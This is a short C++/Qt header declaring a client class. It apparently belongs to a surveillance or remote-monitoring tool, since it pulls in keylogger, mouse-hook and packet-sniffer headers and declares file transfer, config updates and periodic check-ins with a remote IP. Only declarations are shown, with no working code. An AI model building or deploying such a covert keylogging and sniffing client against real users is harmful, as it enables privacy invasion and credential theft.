#pragma once

#include <memory>

#include "sniffer.h"
#include "config.h"
#include "fileserver.h"
#include "fileclient.h"
#include "mousehook.h"
#include "enums.h"
#include "klog.h"

class Client : public QObject
{
    Q_OBJECT
public:
    explicit Client(QObject *parent = 0, const QString& path = QDir::currentPath(),
                    quint16 _locPort = 1234, QString _ip = "127.0.0.1", quint16 _destPort = 12345);
    ~Client();

signals:

private slots:
    void getOnline();
    void getFile(const QString& path, const QString& ip);
    void getString(const QString& string, const QString& ip);

private:
    void update();
    void getNewConfig(const QString& path);
    void enqueueLog();

    quint16 locPort;
    quint16 destPort;
    QString ip;
    QString path;
    std::unique_ptr<QTimer> onlineTimer;
    std::unique_ptr<Config> config;
    std::unique_ptr<FileServer> fileServer;
    std::unique_ptr<FileClient> fileClient;
    std::unique_ptr<Sniffer> sniffer;
};
